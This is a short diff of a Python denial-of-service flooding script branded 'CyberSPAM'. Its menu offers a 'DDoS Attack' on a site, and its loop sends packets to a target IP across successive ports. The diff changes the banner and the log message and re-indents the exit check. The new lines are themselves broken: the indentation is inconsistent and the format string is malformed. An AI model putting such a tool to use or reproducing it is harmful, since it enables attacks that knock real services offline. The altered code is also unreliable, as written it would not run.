@@ -25,7 +25,7 @@ stopminute = 0
 nowminute = 0
 
 print('##########################################')
-print ('Wellcome to PQcyberSPAM softing')
+print ('Wellcome to CyberSPAM-PQ.softing')
 print()
 print ('Get SOFT')
 print ('[1] - DDoS Attack http://SITE')
@@ -59,10 +59,11 @@ while True:
      sent = sent + 1
      port = port + 1
      nowminute = now.minute*1
-     print ('Sent %s packet to %s throught port:%s'%(sent,ip,port))
+            TIME = datetime.now()
+     print ('s%  sent packet #s% to %s on port:%s'%(TIME,sent,ip,port))
      #print (nowminute)
      if port == 65534:
        port = 1
 
-       if nowminute == stopminute: 
-       sys.exit()
+       if nowminute == stopminute:
+                        sys.exit()
